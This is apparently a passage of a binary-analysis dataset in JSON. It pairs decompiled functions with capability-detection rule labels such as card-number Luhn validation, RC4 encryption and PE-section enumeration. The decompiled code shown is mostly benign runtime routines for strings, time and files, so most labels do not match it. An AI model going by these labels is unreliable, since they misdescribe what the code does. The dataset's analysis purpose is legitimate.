            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d8c(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405d28(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.00405670(param_1),  0 < iVar1)) {\n        fcn.00405e18();\n    }\n    else {\n        fcn.00405fa4();\n        fcn.00405670(param_1);\n        fcn.00405fa4();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00405e3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405e3c(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    char *pcVar2;\n    \n    arg_8h = 0;\n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 4) {\n            if (pcVar2[1] == '\\0') {\ncode_r0x00405e5d:\n                pcVar2 = pcVar2 + 1;\n                break;\n            }\n            if (pcVar2[2] == '\\0') {\ncode_r0x00405e5c:\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405e5d;\n            }\n            if (pcVar2[3] == '\\0') {\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405e5c;\n            }\n        }\n        arg_8h = pcVar2 - param_2;\n    }\n    if (arg_8h < 1) {\n        fcn.00405d28(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405670(arg_8h),  0 < iVar1)) {\n        fcn.00405e18();\n    }\n    else {\n        fcn.00405fa4();\n        fcn.00405670(arg_8h);\n        fcn.00405fa4();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00405fa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fa4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (0 < param_2) {\n        fcn.00405d00();\n        iVar1 = fcn.00405ec8();\n        if (0 < iVar1) {\n            fcn.004030fc();\n        }\n    }\n    fcn.00405d18();\n    return;\n}\n",
        "token_count": 97
    },
    "00405fe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fe8(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00406018();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "004060ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004060ac(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.004060f8();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "0040649c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0040649c(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 100
    },
    "00406928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406928(void)\n\n{\n    fcn.0040679c(&stack0x00000004);\n    return;\n}\n",
        "token_count": 31
    },
    "00406998": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00406998(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 84
    },
    "00407550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407550(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack4104 [4096];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00406a10(*(in_EAX + 4), auStack4104, 0x1000);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.00405620();\n        }\n        else {\n            fcn.00405728();\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00407754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407754(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 112
    },
    "0040975c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040975c(uint param_1, uint param_2)\n\n{\n    fcn.0040dbe4(param_1, param_2);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 51
    },
    "004099d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004099d8(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    if (in_EAX == 0) {\n        if (param_2 != 0) {\n            in_EAX = -*(param_2 + -4);\n        }\n        return in_EAX;\n    }\n    if (param_2 == 0) {\n        return *(in_EAX - 4);\n    }\n    uVar4 = *(param_2 + -4);\n    uVar10 = *(in_EAX - 4) - uVar4;\n    iVar6 = (-(*(in_EAX - 4) < uVar4) & uVar10) + uVar4;\n    iVar7 = -iVar6;\n    if (iVar7 != 0) {\n        do {\n            uVar1 = *(iVar7 + iVar6 + in_EAX);\n            uVar4 = uVar1;\n            uVar2 = *(iVar7 + param_2 + iVar6);\n            uVar8 = uVar2;\n            if (uVar4 != uVar8) {\n                if (uVar1 != uVar2) {\n                    uVar4 = uVar1 & 0xff;\n                    uVar8 = uVar2 & 0xff;\n                    cVar3 = uVar1 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar4 = uVar4 - 0x20;\n                    }\n                    cVar3 = uVar2 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar8 = uVar8 - 0x20;\n                    }\n                    if (uVar4 - uVar8 != 0) {\n                        return uVar4 - uVar8;\n                    }\n                    uVar4 = *(iVar7 + iVar6 + in_EAX);\n                    uVar8 = *(iVar7 + param_2 + iVar6);\n                    if (uVar4 >> 8 == uVar8 >> 8) goto code_r0x00409a66;\n                }\n                uVar5 = uVar4 >> 8;\n                uVar9 = uVar8 >> 8;\n                cVar3 = uVar4 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar5 = uVar5 - 0x20;\n                }\n                cVar3 = uVar8 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar9 = uVar9 - 0x20;\n                }\n                if (uVar5 - uVar9 != 0) {\n                    return uVar5 - uVar9;\n                }\n            }\ncode_r0x00409a66:\n            bVar11 = SCARRY4(iVar7, 2);\n            iVar7 = iVar7 + 2;\n        } while (bVar11 != iVar7 < 0);\n    }\n    return uVar10;\n}\n",
        "token_count": 754
    },
    "00409d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d60(uint param_1, uint param_2)\n\n{\n    fcn.00409d14(param_2);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 46
    },
    "00409d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d80(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00409db4(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 515
    },
    "00409e4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e4c(uint arg_8h)\n\n{\n    fcn.00409d80();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 40
    },
    "00409e74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409e74(uint param_1)\n\n{\n    fcn.00409d14(param_1);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 41
    },
    "00409e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e9c(uint arg_8h)\n\n{\n    fcn.00409d80();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 40
    },
    "00409f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409f60(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040676c();\n    if (iVar1 == 0) {\n        fcn.00406928(1);\n        fcn.00405584();\n    }\n    iVar1 = fcn.0040676c();\n    if (iVar1 == 0) {\n        fcn.00406928(1);\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0040a074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a074(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.0040b76c();\n    if (uVar1 == '\\0') {\n        fcn.00409f60();\n        fcn.00406774();\n        uVar1 = fcn.00409ff0(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.00406774();\n            uVar1 = fcn.00409ff0(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x40a0f4;\n    }\n    return uVar1;\n}\n",
        "token_count": 268
    },
    "0040a39c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a39c(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpFileTime;\n    uint lpLocalFileTime;\n    uint32_t wFatTime;\n    \n    wFatTime = param_2;\n    iVar1 = sub.kernel32.dll_DosDateTimeToFileTime(param_2 >> 0x10, param_2 & 0xffff, &lpLocalFileTime);\n    if (((iVar1 != 0) && (iVar1 = sub.kernel32.dll_LocalFileTimeToFileTime(&lpLocalFileTime, &lpFileTime),  iVar1 != 0))\n       && (iVar1 = sub.kernel32.dll_SetFileTime(),  iVar1 != 0)) {\n        return 0;\n    }\n    uVar2 = sub.kernel32.dll_GetLastError_1();\n    return uVar2;\n}\n",
        "token_count": 196
    },
    "0040a3f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0040a3f4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iStack32;\n    int32_t iStack24;\n    uint *puStack20;\n    uint auStack16 [2];\n    \n    do {\n        puStack20 = auStack16;\n        if ((*(in_EAX + 0x20) & *(in_EAX + 0x18)) == 0) {\n            iStack24 = in_EAX + 0x34;\n            sub.kernel32.dll_FileTimeToLocalFileTime();\n            iStack32 = in_EAX + 2;\n            sub.kernel32.dll_FileTimeToDosDateTime(&iStack24);\n            *(in_EAX + 8) = *(in_EAX + 0x40);\n            *(in_EAX + 0xc) = *(in_EAX + 0x3c);\n            *(in_EAX + 0x10) = *(in_EAX + 0x20);\n            fcn.004057a0();\n            uVar2 = 0;\n            goto code_r0x0040a470;\n        }\n        puStack20 = in_EAX + 0x20;\n        auStack16[0] = *(in_EAX + 0x1c);\n        iVar1 = sub.kernel32.dll_FindNextFileA();\n    } while (iVar1 != 0);\n    uVar2 = sub.kernel32.dll_GetLastError_1();\ncode_r0x0040a470:\n    return CONCAT44(iStack32, uVar2);\n}\n",
        "token_count": 346
    },
    "0040a6fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a6fc(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.004059dc(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 85
    },
    "0040a738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a738(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(arg_8h, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.0040649c(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.0040649c(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 248
    },
    "0040aaac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040aaac(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00402f00();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 69
    },
    "0040b67e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b67e(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0040b69a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b69a(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 170
    },
    "0040b6d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b6d0(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0bc(0, 0xf, 0);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 59
    },
    "0040b700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b700(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0bc(0, 0, 0);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 56
    },
    "0040b730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0040b730(void)\n\n{\n    char cVar1;\n    unkbyte10 Stack24;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5bc();\n    if (cVar1 == '\\0') {\n        fcn.0040975c();\n    }\n    return Stack24;\n}\n",
        "token_count": 78
    },
    "0040b788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b788(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5bc();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0040b7b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b7b4(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5bc();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0040b7fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b7fc(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x48f894);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x48f898;\n        iVar2 = -(uVar1 / *0x48f898);\n    }\n    else {\n        iVar2 = uVar1 / *0x48f898;\n        uVar3 = uVar1 % *0x48f898;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 238
    },
    "0040b840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0040b840(double *arg_8h, uint arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_AX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = (in_AX * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x40b8ac;\n        var_1h._0_1_ = 1;\n    }\n    return var_1h;\n}\n",
        "token_count": 211
    },
    "0040b8b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040b8b0(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_8h;\n    \n    cVar1 = fcn.0040b840(&var_8h, arg_8h & 0xffff);\n    if (cVar1 == '\\0') {\n        fcn.00409744();\n    }\n    return _var_8h;\n}\n",
        "token_count": 94
    },
    "0040b8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b8f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7fc(arg_ch, arg_10h, &var_4h);\n    fcn.00409728(arg_ch);\n    fcn.00409728(in_EDX);\n    fcn.00409728(arg_8h);\n    return;\n}\n",
        "token_count": 109
    },
    "0040ba54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040ba54(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint auStack20 [2];\n    \n    puVar2 = auStack20;\n    cVar1 = fcn.0040b988(auStack20);\n    if (cVar1 == '\\0') {\n        fcn.00409744();\n    }\n    return CONCAT44(auStack20[0], puVar2);\n}\n",
        "token_count": 98
    },
    "0040ba84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ba84(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.0040b7fc(arg_ch, arg_10h);\n    if (var_14h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_14h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_14h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.00409728(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.00409728(&var_eh);\n        fcn.00409728(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.0040b94c();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x48f7f6 + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 606
    },
    "0040bbf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bbf0(void)\n\n{\n    double dVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    float10 fVar3;\n    uint uVar4;\n    uint uStack12;\n    \n    fVar3 = fcn.0040ba54();\n    uStack12 = SUB84(fVar3, 0);\n    if (fVar3 < *0x40bc5c) {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b8b0(uVar2);\n        dVar1 = CONCAT44(uStack12, uVar2) - fVar3;\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    else {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b8b0(uVar2);\n        dVar1 = fVar3 + CONCAT44(uStack12, uVar2);\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    return CONCAT44(uStack12, uVar4);\n}\n",
        "token_count": 278
    },
    "0040bc60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bc60(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040b7fc(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 72
    },
    "0040bc88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bc88(void)\n\n{\n    float10 fVar1;\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime(auStack16);\n    fVar1 = fcn.0040ba54();\n    return fVar1;\n}\n",
        "token_count": 62
    },
    "0040bcb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bcb4(void)\n\n{\n    float10 fVar1;\n    uint16_t uStack6;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040b8b0(uStack6);\n    return fVar1;\n}\n",
        "token_count": 64
    },
    "0040bce8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bce8(void)\n\n{\n    float10 fVar1;\n    ushort uStack16;\n    uint16_t uStack14;\n    uint uStack12;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040ba54();\n    uStack12 = SUB84(fVar1, 0);\n    fVar1 = fcn.0040b8b0(uStack14);\n    return fVar1 + CONCAT44(uStack12, CONCAT22(uStack14, uStack16));\n}\n",
        "token_count": 119
    },
    "0040bd38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040bd38(void)\n\n{\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime();\n    return auStack16 & 0xffff;\n}\n",
        "token_count": 43
    },
    "0040bd4c": {
        "rules": [
